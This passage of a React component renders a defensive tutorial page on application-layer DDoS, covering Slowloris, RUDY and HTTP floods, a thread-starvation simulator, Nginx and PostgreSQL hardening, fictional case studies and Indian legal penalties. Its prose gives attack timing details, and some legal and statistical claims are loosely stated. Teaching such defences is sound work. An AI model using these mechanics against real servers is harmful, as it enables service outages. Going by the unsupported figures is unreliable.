                <text x="70" y="106" fill="#a7f3d0" fontSize="7.5" textAnchor="middle">
                  Zero Thread Starvation!
                </text>
              </g>
            </svg>
          </div>
        </section>

        {/* SECTION 3: Studio 1 - 8-Vector Layer 7 Inspector */}
        <section className="bg-gray-900/90 rounded-2xl border border-gray-800 p-6 sm:p-8 space-y-6 shadow-xl">
          <div className="border-b border-gray-800 pb-4">
            <span className="text-xs font-bold uppercase tracking-wider text-indigo-400">
              Interactive Concept Studio 1
            </span>
            <h2 className="text-xl sm:text-2xl font-bold text-white mt-1">
              3. Application Layer Attack Vector &amp; Thread Starvation Inspector
            </h2>
            <p className="text-sm text-gray-300 mt-2">
              Select an application layer attack vector below to examine its target component, exploitation vector, 
              vulnerability impact, telemetry indicators, and resilient defense:
            </p>
          </div>

          {/* Selector Grid */}
          <div className="grid grid-cols-2 sm:grid-cols-4 lg:grid-cols-8 gap-2">
            {Object.values(vectorDatabase).map((item) => (
              <button
                key={item.key}
                onClick={() => setSelectedVectorKey(item.key)}
                className={clsx(
                  "p-3 rounded-xl border text-left transition-all duration-300 flex flex-col justify-between text-xs space-y-2",
                  selectedVectorKey === item.key
                    ? "bg-rose-950/80 border-rose-500 shadow-lg shadow-rose-950/50"
                    : "bg-[#0c101c] border-gray-800 hover:border-gray-700 text-gray-400 hover:text-gray-200"
                )}
              >
                <span className="text-[8.5px] font-bold px-1.5 py-0.5 rounded border bg-rose-950 text-rose-300 border-rose-800 self-start">
                  LAYER 7
                </span>
                <span className="font-bold text-white text-[11px] leading-tight line-clamp-2">{item.name}</span>
              </button>
            ))}
          </div>

          {/* Active Detail Box */}
          <div className="bg-[#070b14] p-5 sm:p-6 rounded-xl border border-gray-800 space-y-6">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-gray-800 pb-4">
              <div>
                <div className="flex items-center gap-2 flex-wrap">
                  <span className={clsx("text-xs font-bold px-2.5 py-0.5 rounded border", activeVector.categoryBadge)}>
                    {activeVector.category}
                  </span>
                  <span className="text-xs px-2.5 py-0.5 rounded bg-gray-900 border border-gray-800 text-gray-300 font-mono">
                    Target: {activeVector.targetComponent}
                  </span>
                </div>
                <h3 className="text-lg font-bold text-white mt-2">{activeVector.name}</h3>
              </div>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-5 text-xs">
              <div className="space-y-4">
                <div className="bg-gray-950 p-4 rounded-lg border border-gray-800 space-y-1.5">
                  <span className="font-bold text-rose-400 uppercase tracking-wider text-[10px] block">
                    Exploitation Vector &amp; Attack Mechanics
                  </span>
                  <p className="text-gray-300 leading-relaxed">{activeVector.exploitationVector}</p>
                </div>

                <div className="bg-gray-950 p-4 rounded-lg border border-gray-800 space-y-1.5">
                  <span className="font-bold text-amber-400 uppercase tracking-wider text-[10px] block">
                    Vulnerability Impact &amp; Telemetry Indicator
                  </span>
                  <p className="text-gray-300 leading-relaxed font-semibold">{activeVector.vulnerabilityImpact}</p>
                  <p className="text-gray-400 text-[11px]">{activeVector.telemetryIndicator}</p>
                </div>
              </div>

              <div className="space-y-4">
                <div className="bg-gray-950 p-4 rounded-lg border border-gray-800 space-y-1.5">
                  <span className="font-bold text-emerald-400 uppercase tracking-wider text-[10px] block">
                    Resilient Enterprise Defense &amp; Countermeasures
                  </span>
                  <p className="text-gray-300 leading-relaxed">{activeVector.resilientDefense}</p>
                </div>

                <div className="bg-gray-950 p-4 rounded-lg border border-gray-800 space-y-1.5">
                  <span className="font-bold text-indigo-400 uppercase tracking-wider text-[10px] block">
                    Technical Mechanism / Header Syntax Example
                  </span>
                  <pre className="bg-black/90 p-3 rounded font-mono text-[11px] text-indigo-200 overflow-x-auto whitespace-pre-wrap border border-indigo-950/50">
                    {activeVector.codeSnippet}
                  </pre>
                </div>
              </div>
            </div>
          </div>
        </section>

        {/* SECTION 4: Studio 2 - Live Thread Starvation Laboratory */}
        <section className="bg-gray-900/90 rounded-2xl border border-gray-800 p-6 sm:p-8 space-y-6 shadow-xl">
          <div className="border-b border-gray-800 pb-4">
            <span className="text-xs font-bold uppercase tracking-wider text-emerald-400">
              Interactive Concept Studio 2
            </span>
            <h2 className="text-xl sm:text-2xl font-bold text-white mt-1">
              4. Layer 7 Thread Starvation &amp; WAF Proof-of-Work Laboratory
            </h2>
            <p className="text-sm text-gray-300 mt-2">
              Adjust attack request rate R_attack, average processing duration T_process, 
              server worker architecture (Apache 256 threads vs Nginx 65,535 connections), and toggle Cloud WAF Proof-of-Work to model thread starvation P_starvation = 1 - e^(-max(0, U - 1.0) × 10):
            </p>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
            {/* Input Controls */}
            <div className="bg-[#050811] p-5 rounded-xl border border-gray-800 space-y-4 text-xs">
              <h3 className="font-bold text-white uppercase tracking-wider text-[11px]">Layer 7 Traffic &amp; Server Variables</h3>

              <div className="space-y-1">
                <div className="flex justify-between text-gray-400">
                  <span>Attack Request Rate (R_attack):</span>
                  <span className="text-rose-400 font-bold font-mono">{attackRps} RPS</span>
                </div>
                <input
                  type="range"
                  min="10"
                  max="2000"
                  step="25"
                  value={attackRps}
                  onChange={(e) => setAttackRps(parseInt(e.target.value))}
                  className="w-full accent-rose-500 bg-gray-800"
                />
              </div>

              <div className="space-y-1">
                <div className="flex justify-between text-gray-400">
                  <span>Processing / Slowloris Hold Time:</span>
                  <span className="text-amber-400 font-bold font-mono">{processingTimeSec.toFixed(1)} Seconds</span>
                </div>
                <input
                  type="range"
                  min="0.5"
                  max="15.0"
                  step="0.5"
                  value={processingTimeSec}
                  onChange={(e) => setProcessingTimeSec(parseFloat(e.target.value))}
                  className="w-full accent-amber-500 bg-gray-800"
                />
              </div>

              <div className="space-y-1">
                <span className="text-gray-400 block">Server Worker Architecture:</span>
                <div className="grid grid-cols-2 gap-2">
                  <button
                    onClick={() => setServerArchitecture("apache_prefork")}
                    className={clsx(
                      "p-2 rounded border font-bold text-[10px] transition-all",
                      serverArchitecture === "apache_prefork"
                        ? "bg-rose-950 border-rose-500 text-rose-300"
                        : "bg-gray-950 border-gray-800 text-gray-400"
                    )}
                  >
                    Apache (256 Threads)
                  </button>
                  <button
                    onClick={() => setServerArchitecture("nginx_epoll")}
                    className={clsx(
                      "p-2 rounded border font-bold text-[10px] transition-all",
                      serverArchitecture === "nginx_epoll"
                        ? "bg-emerald-950 border-emerald-500 text-emerald-300"
                        : "bg-gray-950 border-gray-800 text-gray-400"
                    )}
                  >
                    Nginx (65k Async)
                  </button>
                </div>
              </div>

              <div className="space-y-1 pt-1">
                <span className="text-gray-400 block">Cloud WAF JS Proof-of-Work Challenge:</span>
                <button
                  onClick={() => setWafJsChallengeActive(!wafJsChallengeActive)}
                  className={clsx(
                    "w-full p-2.5 rounded-lg border font-bold text-xs transition-all",
                    wafJsChallengeActive
                      ? "bg-emerald-950 border-emerald-500 text-emerald-300 shadow-md shadow-emerald-950/50"
                      : "bg-gray-950 border-gray-800 text-gray-400"
                  )}
                >
                  {wafJsChallengeActive ? "✔ WAF JS Challenge ACTIVE (Filters 99.8% Bots)" : "❌ WAF JS Challenge INACTIVE"}
                </button>
              </div>
            </div>

            {/* Calculated Output Metrics */}
            <div className="bg-[#050811] p-5 rounded-xl border border-gray-800 col-span-1 md:col-span-2 space-y-4 text-xs">
              <h3 className="font-bold text-white uppercase tracking-wider text-[11px]">Thread Pool &amp; Worker Telemetry</h3>

              <div className="grid grid-cols-2 gap-3">
                <div className="bg-gray-950 p-3 rounded-lg border border-gray-800">
                  <span className="text-gray-400 text-[10px] uppercase block">Active Worker Thread Demand</span>
                  <span className="text-lg font-extrabold text-cyan-400">{starvationSimulation.requiredThreads} Threads</span>
                  <span className="text-[10px] text-gray-400 block mt-0.5">Capacity: {starvationSimulation.workerCapacity} Threads</span>
                </div>

                <div className="bg-gray-950 p-3 rounded-lg border border-gray-800">
                  <span className="text-gray-400 text-[10px] uppercase block">Thread Starvation Probability</span>
                  <span className="text-lg font-extrabold text-white">{starvationSimulation.finalStarvation}%</span>
                  <span className="text-[10px] text-gray-400 block mt-0.5">Utilization: {starvationSimulation.utilization}%</span>
                </div>
              </div>

              <div className={clsx("p-4 rounded-lg border font-mono text-xs", starvationSimulation.badgeClass)}>
                <span className="font-bold block uppercase tracking-wider text-[10px]">Worker Pool Telemetry Assessment:</span>
                <p className="mt-1 font-extrabold text-sm">{starvationSimulation.statusMessage}</p>
              </div>
            </div>
          </div>
        </section>

        {/* SECTION 5: Studio 4 - Layer 7 Security Code Studio */}
        <section className="bg-gray-900/90 rounded-2xl border border-gray-800 p-6 sm:p-8 space-y-6 shadow-xl">
          <div className="border-b border-gray-800 pb-4">
            <span className="text-xs font-bold uppercase tracking-wider text-purple-400">
              Nginx Timeouts &amp; SQL Hardening Studio
            </span>
            <h2 className="text-xl sm:text-2xl font-bold text-white mt-1">
              5. Production Nginx Timeouts &amp; PostgreSQL Hardening Studio
            </h2>
            <p className="text-sm text-gray-300 mt-2">
              Explore production Nginx reverse proxy configurations with client header/body timeouts and Token Bucket rate limiting, 
              Python Slowloris test scripts, and PostgreSQL statement timeout configurations:
            </p>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-3 gap-2">
            {Object.entries(codeDatabase).map(([key, item]) => (
              <button
                key={key}
                onClick={() => setActiveCodeTab(key)}
                className={clsx(
                  "p-3 rounded-xl border text-left transition-all duration-300 text-xs font-bold",
                  activeCodeTab === key
                    ? "bg-purple-950 border-purple-500 text-purple-300 shadow-md shadow-purple-950/50"
                    : "bg-[#0b101c] border-gray-800 hover:border-gray-700 text-gray-400"
                )}
              >
                {item.name}
              </button>
            ))}
          </div>

          <div className="bg-[#050811] p-5 sm:p-6 rounded-xl border border-gray-800 space-y-4">
            <div className="flex items-center justify-between border-b border-gray-800 pb-3">
              <h3 className="text-sm font-bold text-white">{activeCode.name}</h3>
              <span className="text-xs px-2.5 py-0.5 rounded bg-gray-900 border border-gray-800 text-purple-400 font-mono">
                Production Config
              </span>
            </div>

            <p className="text-xs text-gray-300">{activeCode.explanation}</p>

            <pre className="bg-black/90 p-4 rounded-lg font-mono text-xs text-purple-200 overflow-x-auto whitespace-pre-wrap border border-purple-950/50">
              {activeCode.code}
            </pre>
          </div>
        </section>

        {/* SECTION 6: Studio 3 - Regional West Bengal Pedagogical Case Studies */}
        <section className="bg-gray-900/90 rounded-2xl border border-gray-800 p-6 sm:p-8 space-y-6 shadow-xl">
          <div className="border-b border-gray-800 pb-4">
            <span className="text-xs font-bold uppercase tracking-wider text-amber-400">
              Regional Engineering Applications
            </span>
            <h2 className="text-xl sm:text-2xl font-bold text-white mt-1">
              6. West Bengal Field Case Studies: Kolkata, Barrackpore, Ichapur &amp; Jadavpur
            </h2>
            <p className="text-sm text-gray-300 mt-2">
              Explore how cybersecurity leaders Mamata, Debangshu, Mahima, and Susmita filter 250k RPS residential proxy floods, 
              harden SCADA TLS handshakes, and neutralize RUDY slow-POSTs across West Bengal infrastructure:
            </p>
          </div>

          {/* Scenario Tabs */}
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3">
            {localScenarios.map((sc) => (
              <button
                key={sc.id}
                onClick={() => setActiveScenarioId(sc.id)}
                className={clsx(
                  "p-4 rounded-xl border text-left transition-all duration-300 space-y-2",
                  activeScenarioId === sc.id
                    ? "bg-amber-950/60 border-amber-500 shadow-md"
                    : "bg-[#0b101c] border-gray-800 hover:border-gray-700 text-gray-400"
                )}
              >
                <span className="text-[10px] font-bold px-2 py-0.5 rounded bg-gray-900 text-amber-300 border border-amber-800">
                  {sc.lead} · {sc.location.split(" ")[0]}
                </span>
                <h4 className="text-xs font-bold text-white line-clamp-1">{sc.title}</h4>
                <p className="text-[11px] text-gray-400 line-clamp-1">{sc.threatType}</p>
              </button>
            ))}
          </div>

          {/* Active Scenario Detailed Breakdown */}
          <div className="bg-[#070b14] p-6 rounded-xl border border-gray-800 space-y-5">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-gray-800 pb-3">
              <div>
                <span className="text-xs font-bold text-amber-400 uppercase tracking-wider">
                  {activeScenario.location}
                </span>
                <h3 className="text-base sm:text-lg font-bold text-white mt-0.5">{activeScenario.title}</h3>
              </div>
              <div className="text-right text-xs">
                <span className="text-gray-400 block">Lead Architect: {activeScenario.lead}</span>
                <span className="font-semibold text-emerald-400">Security Budget: {activeScenario.budget}</span>
              </div>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-5 text-xs">
              <div className="bg-gray-950 p-4 rounded-lg border border-gray-800 space-y-2">
                <span className="font-bold text-rose-400 uppercase tracking-wider text-[10px]">
                  The Incident &amp; Layer 7 Attack Vector
                </span>
                <p className="text-gray-300 leading-relaxed">{activeScenario.incident}</p>
              </div>

              <div className="bg-gray-950 p-4 rounded-lg border border-gray-800 space-y-2">
                <span className="font-bold text-emerald-400 uppercase tracking-wider text-[10px]">
                  Architectural Defense &amp; Resolution
                </span>
                <p className="text-gray-300 leading-relaxed">{activeScenario.defenseStrategy}</p>
              </div>
            </div>

            {/* Metrics Dashboard */}
            <div className="bg-[#050811] p-4 rounded-lg border border-gray-800 grid grid-cols-2 sm:grid-cols-4 gap-3 text-center">
              {Object.entries(activeScenario.metrics).map(([key, val]) => (
                <div key={key} className="bg-gray-950 p-2.5 rounded border border-gray-800/80">
                  <span className="text-[10px] text-gray-400 uppercase tracking-wider block capitalize">
                    {key.replace(/([A-Z])/g, " $1")}
                  </span>
                  <span className="text-xs sm:text-sm font-extrabold text-white mt-1 block">{val}</span>
                </div>
              ))}
            </div>
          </div>
        </section>

        {/* SECTION 7: Statutory & Legal Frameworks in India */}
        <section className="bg-gray-900/90 rounded-2xl border border-gray-800 p-6 sm:p-8 space-y-6 shadow-xl">
          <div className="border-b border-gray-800 pb-4">
            <span className="text-xs font-bold uppercase tracking-wider text-purple-400">
              Statutory Jurisprudence
            </span>
            <h2 className="text-xl sm:text-2xl font-bold text-white mt-1">
              7. Legal Penalties for Application Layer DDoS &amp; Cyber Terrorism in India
            </h2>
            <p className="text-sm text-gray-300 mt-2">
              Indian cyber law, national infrastructure protection mandates, and criminal mischief statutes 
              treat Application Layer DDoS attacks with severe civil compensation liabilities and life imprisonment penalties:
            </p>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-3 gap-5 text-xs">
            <div className="bg-gray-950 p-5 rounded-xl border border-rose-950 space-y-3">
              <span className="text-xs font-bold text-rose-400 uppercase tracking-wider block">
                IT Act 2000 Section 66F
              </span>
              <ul className="space-y-2 text-gray-300">
                <li>
                  <strong className="text-white">Cyber Terrorism:</strong> Layer 7 attacks paralyzing critical infrastructure carry <span className="text-rose-400 font-bold">LIFE IMPRISONMENT</span>.
                </li>
              </ul>
            </div>

            <div className="bg-gray-950 p-5 rounded-xl border border-blue-950 space-y-3">
              <span className="text-xs font-bold text-blue-400 uppercase tracking-wider block">
                IT Act Section 43(f) &amp; 70
              </span>
              <ul className="space-y-2 text-gray-300">
                <li>
                  <strong className="text-white">Section 43(f):</strong> Civil damages up to <span className="text-rose-400 font-bold">₹1 CRORE</span> for denying authorized access.
                </li>
                <li>
                  <strong className="text-white">Section 70:</strong> Protected Systems DDoS (Up to 10 years prison).
                </li>
              </ul>
            </div>

            <div className="bg-gray-950 p-5 rounded-xl border border-emerald-950 space-y-3">
              <span className="text-xs font-bold text-emerald-400 uppercase tracking-wider block">
                DPDP Act 2023 &amp; IPC 420
              </span>
              <ul className="space-y-2 text-gray-300">
                <li>
                  <strong className="text-white">DPDP Section 33:</strong> Fines up to <span className="text-rose-400 font-bold">₹250 CRORES</span> for persistent application availability safeguards collapse.
                </li>
                <li>
                  <strong className="text-white">IPC Section 420:</strong> Layer 7 DDoS extortion (Up to 7 years prison).
                </li>
              </ul>
            </div>
          </div>
        </section>

        {/* SECTION 8: Common Pitfalls, Pro Tips, Thinking Hints & Mini Checklist */}
        <section className="bg-gray-900/90 rounded-2xl border border-gray-800 p-6 sm:p-8 space-y-6 shadow-xl">
          <div className="border-b border-gray-800 pb-4">
            <span className="text-xs font-bold uppercase tracking-wider text-purple-400">
              Exam &amp; Professional Mastery
            </span>
            <h2 className="text-xl sm:text-2xl font-bold text-white mt-1">
              8. Common Pitfalls, Industry Best Practices &amp; Key Hints
            </h2>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-3 gap-5 text-xs">
            {/* Common Pitfalls */}
            <div className="bg-gray-950 p-4 rounded-xl border border-rose-950/60 space-y-3">
              <span className="font-bold text-rose-400 uppercase tracking-wider text-[10px] block">
                Common Beginner Mistakes
              </span>
              <ul className="space-y-2 text-gray-300 list-disc list-inside">
                <li>
                  <strong>Relying Exclusively on IP Rate Limiting:</strong> Residential proxy botnets easily bypass per-IP limits.
                </li>
                <li>
                  <strong>Leaving Client Header Timeouts at Default (60s+):</strong> Allows Slowloris to hold worker threads open for minutes.
                </li>
                <li>
                  <strong>Allowing Uncapped SQL Search Queries:</strong> Unindexed JOINs lock database connection pools at 100% CPU.
                </li>
              </ul>
            </div>

            {/* Professional Tips */}
            <div className="bg-gray-950 p-4 rounded-xl border border-emerald-950/60 space-y-3">
              <span className="font-bold text-emerald-400 uppercase tracking-wider text-[10px] block">
                Professional Tips &amp; Tricks
              </span>
              <ul className="space-y-2 text-gray-300 list-disc list-inside">
                <li>
                  <strong>Deploy Asynchronous Nginx Event Loops (`epoll`):</strong> Multiplexes 65,000+ connections per worker thread.
                </li>
                <li>
                  <strong>Activate Cloud WAF JavaScript Proof-of-Work:</strong> Drops automated bot scripts before touching the origin.
                </li>
                <li>
                  <strong>Enforce `statement_timeout = '3s'` in SQL:</strong> Terminates expensive search queries after 3 seconds.
                </li>
              </ul>
            </div>

            {/* Hint Section */}
            <div className="bg-gray-950 p-4 rounded-xl border border-indigo-950/60 space-y-3">
              <span className="font-bold text-indigo-400 uppercase tracking-wider text-[10px] block">
                Pedagogical Thinking Hints
              </span>
              <ul className="space-y-2 text-gray-300">
                <li className="p-2 bg-gray-900 rounded border border-gray-800">
                  <span className="text-indigo-300 font-bold block">Think about...</span>
                  Why does Slowloris succeed in crashing an Apache web server with less than 5 KB/s of attacker bandwidth?
                </li>
                <li className="p-2 bg-gray-900 rounded border border-gray-800">
                  <span className="text-indigo-300 font-bold block">Observe carefully...</span>
                  Why does a JavaScript proof-of-work puzzle filter out 99.8% of HTTP flood scripts while remaining completely seamless for real web browsers?
                </li>
                <li className="p-2 bg-gray-900 rounded border border-gray-800">
                  <span className="text-indigo-300 font-bold block">Try changing this...</span>
                  In the laboratory above, switch server architecture to Nginx (65k Async) and observe thread starvation collapse to 0.00%!
                </li>
              </ul>
            </div>
          </div>

          {/* Mini Checklist */}
          <div className="bg-gray-950 p-5 rounded-xl border border-gray-800 space-y-3">
            <h3 className="text-xs font-bold text-white uppercase tracking-wider text-rose-400">
              Student Mini Checklist (Exam &amp; Career Essentials)
            </h3>
            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-2.5 text-xs text-gray-300">
              <div className="flex items-center gap-2 p-2.5 bg-gray-900 rounded border border-gray-800">
                <span className="text-emerald-400">✔</span>
                <span>Layer 7 DDoS attacks target application logic, worker threads, and databases (RPS).</span>
              </div>
              <div className="flex items-center gap-2 p-2.5 bg-gray-900 rounded border border-gray-800">
                <span className="text-emerald-400">✔</span>
                <span>Slowloris sends incomplete HTTP headers every 15s, holding server worker threads open.</span>
              </div>
              <div className="flex items-center gap-2 p-2.5 bg-gray-900 rounded border border-gray-800">
                <span className="text-emerald-400">✔</span>
                <span>RUDY sends form body data at 1 byte/10s, tying up web server form-handling processes.</span>
              </div>
              <div className="flex items-center gap-2 p-2.5 bg-gray-900 rounded border border-gray-800">
                <span className="text-emerald-400">✔</span>
                <span>Asynchronous Nginx event loops (`epoll`) handle 65,000+ connections, defeating Slowloris.</span>
              </div>
              <div className="flex items-center gap-2 p-2.5 bg-gray-900 rounded border border-gray-800">
                <span className="text-emerald-400">✔</span>
                <span>Cloudflare Under Attack Mode uses JavaScript proof-of-work puzzles to drop automated bot scripts.</span>
              </div>
              <div className="flex items-center gap-2 p-2.5 bg-gray-900 rounded border border-gray-800">
                <span className="text-emerald-400">✔</span>
                <span>Section 66F of the IT Act penalizes Layer 7 Cyber Terrorism with Life Imprisonment.</span>
              </div>
            </div>
          </div>
        </section>

        {/* SECTION 9: FAQ Template */}
        <section className="space-y-4">
          <FAQTemplate
            title="Application Layer DDoS FAQs"
            subtitle="30 Moderate to Expert Practice Questions & Layer 7 Defense Deep Dives"
            questions={questions}
          />
        </section>

        {/* SECTION 10: PlainTextPrint Component */}
        <section className="space-y-4">
          <PlainTextPrint
            content={noteText}
            title="Application Layer DDoS Attacks: HTTP Flood and Slowloris (Printable Study Guide)"
            stampEnabled={true}
            showDownload={true}
            downloadButtonText="Download Note"
            downloadFileName="topic5_note.txt"
          />
        </section>

        {/* SECTION 11: Dedicated Teacher's Note */}
        <section className="pt-4">
          <Teacher
            note="Teacher's Note: Application Layer (Layer 7) DDoS attacks represent the most computationally insidious class of threats in modern cybersecurity, bypassing network firewalls by generating legitimate-looking HTTP/HTTPS requests that target backend application logic, worker threads, and database connection pools! Master the mechanics: Slowloris exploits thread-based servers (Apache prefork) by drip-feeding incomplete HTTP headers every 15 seconds to hold all 256 worker threads open with under 5 KB/s of bandwidth; R-U-Dead-Yet (RUDY) sends form POST bodies at 1 byte/10s; and HTTP GET floods target expensive dynamic search endpoints (`/search?q=pan_data`) to drive database CPU to 100%. Master modern enterprise countermeasures: deploy asynchronous event-driven reverse proxies (Nginx `epoll`) that multiplex 65,000+ connections with `client_header_timeout 10s` and `client_body_timeout 10s`, activate Cloudflare Under Attack Mode issuing 5-second JavaScript proof-of-work puzzles that drop 99.8% of automated bot scripts at the cloud edge, and cap database query execution with `SET statement_timeout = '3s'`. Remember that Section 66F of the Indian IT Act treats application-layer cyber terrorism against critical infrastructure with Life Imprisonment, and Section 43(f) provides civil compensation up to ₹1 Crore for denying authorized access!"
          />
        </section>

      </div>
    </div>
  );
};

export default Topic5;
